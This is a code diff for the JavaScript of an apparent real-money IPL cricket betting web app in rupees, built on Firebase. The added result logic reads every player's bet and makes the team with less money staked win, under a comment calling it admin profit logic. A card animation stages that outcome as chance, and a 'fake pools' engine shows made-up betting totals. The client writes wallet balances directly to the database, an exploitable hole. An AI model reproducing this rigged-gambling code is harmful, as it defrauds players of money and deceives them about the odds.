@@ -236,8 +236,7 @@
     if(!firebase.apps.length) firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // 🔥 PERFECT DASHBOARD USER SYNC 🔥
-    const userPhone = localStorage.getItem('userPhone') || "Guest";
+    const userPhone = localStorage.getItem('userPhone') || localStorage.getItem('phone') || "Guest";
 
     const teams = ["CSK", "DC", "GT", "KKR", "LSG", "MI", "PBKS", "RR", "RCB", "SRH"];
     const teamLogos = { "CSK": "assets/IPL_team_5001.png", "DC": "assets/IPL_team_5002.png", "GT": "assets/IPL_team_5003.png", "KKR": "assets/IPL_team_5004.png", "LSG": "assets/IPL_team_5005.png", "MI": "assets/IPL_team_5006.png", "PBKS": "assets/IPL_team_5007.png", "RR": "assets/IPL_team_5008.png", "RCB": "assets/IPL_team_5009.png", "SRH": "assets/IPL_team_5010.png" };
@@ -252,7 +251,6 @@
     document.getElementById('teamB').innerHTML = selectHTML;
     document.getElementById('teamB').selectedIndex = 1;
 
-    // 🔥 GLOBAL WALLET VARIABLES 🔥
     let totalBal = 0, depBal = 0, winBal = 0, bonBal = 0;
     let myBetsRecord = [];
     let serverOffset = 0, currentMatchNoGlobal = 1;
@@ -260,7 +258,6 @@
     document.getElementById('mybet-l1').innerText = "₹" + (parseInt(localStorage.getItem('bet_live-t1')) || 0);
     document.getElementById('mybet-l2').innerText = "₹" + (parseInt(localStorage.getItem('bet_live-t2')) || 0);
 
-    // Coin Sound function
     function playSound(audioId, vol) {
         try {
             let snd = document.getElementById(audioId).cloneNode();
@@ -269,24 +266,24 @@
         } catch(e){}
     }
 
-    // ---------------- FAST BALANCE & ID SYNC (From Dashboard Script) ----------------
-    db.ref('users/' + userPhone).on('value', (snapshot) => {
-        const data = snapshot.val() || {};
-        
-        document.getElementById('player-id-display').innerText = "ID: " + (data.playerId || "KP" + String(userPhone).slice(-4));
-        
-        depBal = parseFloat(data.balance || 0);
-        winBal = parseFloat(data.winning_balance || 0);
-        bonBal = parseFloat(data.bonus_balance || 0);
-        
-        totalBal = Math.max(0, depBal + winBal + bonBal);
-        document.getElementById('wallet-bal').innerText = totalBal.toFixed(2);
-    });
+    function loadBalanceData(p) {
+        db.ref('users/' + p).on('value', snap => {
+            const d = snap.val() || {};
+            document.getElementById('player-id-display').innerText = "ID: " + (d.playerId || "KP" + String(p).slice(-4));
+            
+            depBal = parseFloat(d.balance || 0);
+            winBal = parseFloat(d.winning_balance || 0);
+            bonBal = parseFloat(d.bonus_balance || 0);
+            
+            totalBal = Math.max(0, depBal + winBal + bonBal);
+            document.getElementById('wallet-bal').innerText = totalBal.toFixed(2);
+        });
+    }
+    if(userPhone) { loadBalanceData(userPhone); }
 
     let rules = { champLock: 20, semiLock: 70 }; 
     db.ref('Game/IPL_Match/Rules').on('value', snap => { if(snap.exists()) rules = snap.val(); });
 
-    // ---------------- FAKE POOLS ENGINE ----------------
     let fakePools = JSON.parse(localStorage.getItem('vip_fake_pools')) || {};
     function initFakePools() {
         if(!fakePools['live-t1']) fakePools['live-t1'] = 15000 + Math.floor(Math.random()*5000);
@@ -329,6 +326,24 @@
     db.ref('.info/serverTimeOffset').on('value', snap => { serverOffset = snap.val() || 0; });
     window.resultShown = false; 
 
+    // 🔥 FIX: DYNAMICALLY UPDATE MAIN SCREEN CARDS TO MATCH SCHEDULE 🔥
+    function updateLiveMatchUI(matchNo) {
+        let t1 = teams[(matchNo - 1) % 10];
+        let t2 = teams[(matchNo + 4) % 10];
+
+        // Names
+        ['name-t1','l-name-t1', 's-name-t1'].forEach(id => { let e = document.getElementById(id); if(e) e.innerText = t1; });
+        ['name-t2','l-name-t2', 's-name-t2'].forEach(id => { let e = document.getElementById(id); if(e) e.innerText = t2; });
+
+        // Logos
+        let logo1 = document.getElementById('logo-t1');
+        let logo2 = document.getElementById('logo-t2');
+        if(logo1) logo1.src = teamLogos[t1] || "assets/IPL_team_5001.png";
+        if(logo2) logo2.src = teamLogos[t2] || "assets/IPL_team_5006.png";
+
+        generateSchedule(); 
+    }
+
     function checkGameStatus() {
         let serverTimeMs = new Date().getTime() + serverOffset; 
         let startTime = new Date(serverTimeMs); startTime.setHours(10, 0, 0, 0); 
@@ -346,10 +361,12 @@
 
         if (serverTimeMs < startTime.getTime() || serverTimeMs > endTime.getTime()) {
             window.isGameLocked = false; 
+            currentMatchNoGlobal = 1; 
             document.getElementById('match-no-display').innerText = "1";
             document.getElementById('timer').innerText = "10:00 AM";
-            currentMatchNoGlobal = 1; 
             
+            updateLiveMatchUI(currentMatchNoGlobal); // Sync to Match 1
+
             document.getElementById('champ-lock').style.display = 'none';
             document.getElementById('semi-lock').style.display = 'none';
             document.getElementById('combo-lock').style.display = 'none';
@@ -359,6 +376,8 @@
             window.isGameLocked = false;
             currentMatchNoGlobal = newMatchNo;
             document.getElementById('match-no-display').innerText = currentMatchNoGlobal;
+
+            updateLiveMatchUI(currentMatchNoGlobal); // Auto Sync with active match!
 
             if(currentMatchNoGlobal > rules.champLock) document.getElementById('champ-lock').style.display = 'flex'; else document.getElementById('champ-lock').style.display = 'none';
             if(currentMatchNoGlobal > rules.semiLock) { document.getElementById('semi-lock').style.display = 'flex'; document.getElementById('combo-lock').style.display = 'flex'; }
@@ -380,16 +399,6 @@
     }
     setInterval(checkGameStatus, 1000);
 
-    db.ref('Game/IPL_Match/Today').on('value', snap => {
-        let d = snap.val(); if(!d) return;
-        ['name-t1','l-name-t1', 's-name-t1'].forEach(id => { let e = document.getElementById(id); if(e) e.innerText = d.Team1; });
-        ['name-t2','l-name-t2', 's-name-t2'].forEach(id => { let e = document.getElementById(id); if(e) e.innerText = d.Team2; });
-        
-        document.getElementById('logo-t1').src = teamLogos[d.Team1] || "assets/IPL_team_5001.png";
-        document.getElementById('logo-t2').src = teamLogos[d.Team2] || "assets/IPL_team_5006.png";
-        generateSchedule();
-    });
-
     function generateSchedule() {
         let listHTML = ""; let startTime = new Date(); startTime.setHours(10, 0, 0, 0);
         let now = new Date().getTime() + serverOffset;
@@ -404,6 +413,7 @@
         document.getElementById('schedule-list').innerHTML = listHTML;
     }
 
+    // 🔥 REAL ADMIN SIKANDAR PROFIT LOGIC 🔥
     function showCardReveal() {
         let t1Name = document.getElementById('name-t1').innerText;
         let t2Name = document.getElementById('name-t2').innerText;
@@ -415,49 +425,60 @@
         c2Box.innerHTML = "?"; c2Box.classList.remove('opened');
         document.getElementById('match-result-popup').style.display = "flex";
 
-        let myBetT1 = parseInt(localStorage.getItem('bet_live-t1')) || 0;
-        let myBetT2 = parseInt(localStorage.getItem('bet_live-t2')) || 0;
-        
-        let t1Wins;
-        if (myBetT1 > myBetT2) t1Wins = false;
-        else if (myBetT2 > myBetT1) t1Wins = true;
-        else t1Wins = Math.random() > 0.5;
-
-        const suits = [{s:'♠️', c:'#000'}, {s:'♥️', c:'#ff3333'}, {s:'♣️', c:'#000'}, {s:'♦️', c:'#ff3333'}];
-        const vals = ['2','3','4','5','6','7','8','9','10','J','Q','K','A'];
-        let winIdx = Math.floor(Math.random()*4)+9; 
-        let loseIdx = Math.floor(Math.random()*7); 
-        
-        let s1 = suits[Math.floor(Math.random()*4)], s2 = suits[Math.floor(Math.random()*4)];
-
-        setTimeout(() => { c1Box.classList.add('opened'); c1Box.innerHTML = `<span style="color:${s1.c}">${s1.s}<br>${vals[t1Wins ? winIdx : loseIdx]}</span>`; }, 1000);
-        setTimeout(() => { c2Box.classList.add('opened'); c2Box.innerHTML = `<span style="color:${s2.c}">${s2.s}<br>${vals[!t1Wins ? winIdx : loseIdx]}</span>`; }, 2500);
-        
-        setTimeout(() => {
-            let winAmt = t1Wins && myBetT1 > 0 ? myBetT1 * 1.95 : (!t1Wins && myBetT2 > 0 ? myBetT2 * 1.95 : 0);
-            if(winAmt > 0) {
-                db.ref('users/' + userPhone).once('value', snap => {
-                    let d = snap.val() || {};
-                    let nWin = parseFloat(d.winning_balance || 0);
-                    db.ref('users/' + userPhone).update({ winning_balance: nWin + winAmt });
-                });
-                
-                document.getElementById('win-loss-msg').innerHTML = `🎉 WON ₹${winAmt.toFixed(2)}`;
-                document.getElementById('win-loss-msg').style.color = "var(--green)";
-            } else if(myBetT1+myBetT2 > 0) { 
-                document.getElementById('win-loss-msg').innerHTML = "😢 LOST!"; 
-                document.getElementById('win-loss-msg').style.color = "#ff3333";
-            } else { 
-                document.getElementById('win-loss-msg').innerHTML = (t1Wins ? t1Name : t2Name) + " WINS!"; 
-                document.getElementById('win-loss-msg').style.color = "#fff";
+        db.ref('Game/IPL_Match/Bets').once('value', snap => {
+            let allBets = snap.val() || {};
+            let totalT1 = 0, totalT2 = 0;
+            
+            for(let p in allBets) {
+                totalT1 += (allBets[p]['live-t1'] || 0);
+                totalT2 += (allBets[p]['live-t2'] || 0);
             }
-        }, 3500);
+            
+            let t1Wins;
+            // Jis team par paisa KAM hai, wo jitegi
+            if (totalT1 > totalT2) t1Wins = false; 
+            else if (totalT2 > totalT1) t1Wins = true;
+            else t1Wins = Math.random() > 0.5;
 
-        setTimeout(() => { 
-            document.getElementById('match-result-popup').style.display = "none"; 
-            localStorage.setItem('bet_live-t1', 0); localStorage.setItem('bet_live-t2', 0);
-            document.getElementById('mybet-l1').innerText="₹0"; document.getElementById('mybet-l2').innerText="₹0"; 
-        }, 6500);
+            const suits = [{s:'♠️', c:'#000'}, {s:'♥️', c:'#ff3333'}, {s:'♣️', c:'#000'}, {s:'♦️', c:'#ff3333'}];
+            const vals = ['2','3','4','5','6','7','8','9','10','J','Q','K','A'];
+            let winIdx = Math.floor(Math.random()*4)+9; 
+            let loseIdx = Math.floor(Math.random()*7); 
+            
+            let s1 = suits[Math.floor(Math.random()*4)], s2 = suits[Math.floor(Math.random()*4)];
+
+            setTimeout(() => { c1Box.classList.add('opened'); c1Box.innerHTML = `<span style="color:${s1.c}">${s1.s}<br>${vals[t1Wins ? winIdx : loseIdx]}</span>`; }, 1000);
+            setTimeout(() => { c2Box.classList.add('opened'); c2Box.innerHTML = `<span style="color:${s2.c}">${s2.s}<br>${vals[!t1Wins ? winIdx : loseIdx]}</span>`; }, 2500);
+            
+            setTimeout(() => {
+                let myBetT1 = parseInt(localStorage.getItem('bet_live-t1')) || 0;
+                let myBetT2 = parseInt(localStorage.getItem('bet_live-t2')) || 0;
+                let winAmt = t1Wins && myBetT1 > 0 ? myBetT1 * 1.95 : (!t1Wins && myBetT2 > 0 ? myBetT2 * 1.95 : 0);
+                
+                if(winAmt > 0 && userPhone) {
+                    db.ref('users/'+userPhone+'/winning_balance').set(winBal + winAmt);
+                    document.getElementById('win-loss-msg').innerHTML = `🎉 WON ₹${winAmt.toFixed(2)}`;
+                    document.getElementById('win-loss-msg').style.color = "var(--green)";
+                } else if(myBetT1+myBetT2 > 0) { 
+                    document.getElementById('win-loss-msg').innerHTML = "😢 LOST!"; 
+                    document.getElementById('win-loss-msg').style.color = "#ff3333";
+                } else { 
+                    document.getElementById('win-loss-msg').innerHTML = (t1Wins ? t1Name : t2Name) + " WINS!"; 
+                    document.getElementById('win-loss-msg').style.color = "#fff";
+                }
+            }, 3500);
+
+            setTimeout(() => { 
+                document.getElementById('match-result-popup').style.display = "none"; 
+                localStorage.setItem('bet_live-t1', 0); localStorage.setItem('bet_live-t2', 0);
+                document.getElementById('mybet-l1').innerText="₹0"; document.getElementById('mybet-l2').innerText="₹0"; 
+                
+                if(userPhone && userPhone !== "Guest") {
+                    db.ref('Game/IPL_Match/Bets/' + userPhone + '/live-t1').remove();
+                    db.ref('Game/IPL_Match/Bets/' + userPhone + '/live-t2').remove();
+                }
+            }, 6500);
+        });
     }
 
     function generatePointsTable(playedTotal) {
@@ -497,7 +518,6 @@
     } 
     generateWinners(false);
 
-    // ---------------- 🔥 DYNAMIC SCROLLING BET MODAL 🔥 ----------------
     let pendingBet = { id: '', type: '', team: '', amount: 50 };
 
     function openBetModal(id, type, team) {
@@ -523,62 +543,41 @@
         element.classList.add('selected');
     }
 
-    // ---------------- 🔥 EXACT ANDAR BAHAR SYNCHRONOUS DEDUCTION 🔥 ----------------
     function confirmBet() {
-        let amount = pendingBet.amount;
-        if(totalBal < amount) return alert("Low Balance! Please recharge.");
+        if(!userPhone || userPhone === "Guest") { alert("Login Error!"); return; }
+        
+        let rem = pendingBet.amount;
+        if(totalBal < rem) { alert("Insufficient Balance!"); return; }
         
         closeModal('bet-amount-modal');
         
-        // Using global variables just like Andar Bahar for fast update
-        let nDep = depBal, nWin = winBal, nBon = bonBal, rem = amount;
+        let nDep = depBal, nWin = winBal;
+        if(nDep >= rem) { nDep -= rem; } else { rem -= nDep; nDep = 0; nWin -= rem; }
+        
+        // 1. Update Wallet instantly
+        db.ref('users/'+userPhone).update({ balance: Math.max(0, nDep), winning_balance: Math.max(0, nWin) });
 
-        if (nDep >= rem) { 
-            nDep -= rem; rem = 0; 
-        } else { 
-            rem -= nDep; nDep = 0; 
-            if (nWin >= rem) { 
-                nWin -= rem; rem = 0; 
-            } else { 
-                rem -= nWin; nWin = 0; nBon -= rem; rem = 0; 
-            } 
+        // 2. Register Bet
+        db.ref(`Game/IPL_Match/Bets/${userPhone}/${pendingBet.id}`).set(firebase.database.ServerValue.increment(pendingBet.amount));
+
+        // 3. Update Screen locally instantly
+        let id = pendingBet.id;
+        if(id.startsWith('live-')) {
+            let betKey = 'bet_' + id;
+            let currBet = parseInt(localStorage.getItem(betKey)) || 0;
+            localStorage.setItem(betKey, currBet + pendingBet.amount);
+            let el = document.getElementById(id.replace('live-t', 'mybet-l'));
+            if(el) el.innerText = "₹" + (currBet + pendingBet.amount);
+        } else if(id.startsWith('semi-')) {
+            let el = document.getElementById(id.replace('semi-t', 'bet-s'));
+            if(el) el.innerText = "₹" + ((parseInt(el.innerText.replace('₹','')) || 0) + pendingBet.amount);
+        } else if(id.startsWith('champ-')) {
+            let el = document.getElementById(id.replace('champ-', 'bet-c-'));
+            if(el) el.innerText = (parseInt(el.innerText) || 0) + pendingBet.amount;
         }
 
-        // Fire and forget logic, directly triggers Firebase update
-        db.ref('users/'+userPhone).update({ 
-            balance: Math.max(0, nDep), 
-            winning_balance: Math.max(0, nWin), 
-            bonus_balance: Math.max(0, nBon) 
-        });
-
-        // 🔥 CRITICAL BUG FIX: String replacement crash preventing UI update 🔥
-        try {
-            let id = pendingBet.id;
-            if(id.startsWith('live-')) {
-                let betKey = 'bet_' + id;
-                let currBet = parseInt(localStorage.getItem(betKey)) || 0;
-                localStorage.setItem(betKey, currBet + amount);
-                
-                let targetId = id.replace('live-t', 'mybet-l');
-                let el = document.getElementById(targetId);
-                if(el) el.innerText = "₹" + (currBet + amount);
-                
-            } else if(id.startsWith('semi-')) {
-                let targetId = id.replace('semi-t', 'bet-s');
-                let el = document.getElementById(targetId);
-                if(el) el.innerText = "₹" + ((parseInt(el.innerText.replace('₹','')) || 0) + amount);
-                
-            } else if(id.startsWith('champ-')) {
-                let targetId = id.replace('champ-', 'bet-c-');
-                let el = document.getElementById(targetId);
-                if(el) el.innerText = (parseInt(el.innerText.replace('₹','')) || 0) + amount;
-            }
-        } catch (error) {
-            console.error("UI Update Error Ignored: ", error);
-        }
-
-        addRecord(pendingBet.type, pendingBet.team, amount);
-        playSound('coinSnd', 1.0); // KACHING! 🪙
+        addRecord(pendingBet.type, pendingBet.team, pendingBet.amount);
+        playSound('coinSnd', 1.0);
     }
 
     function placeCombo(type) {
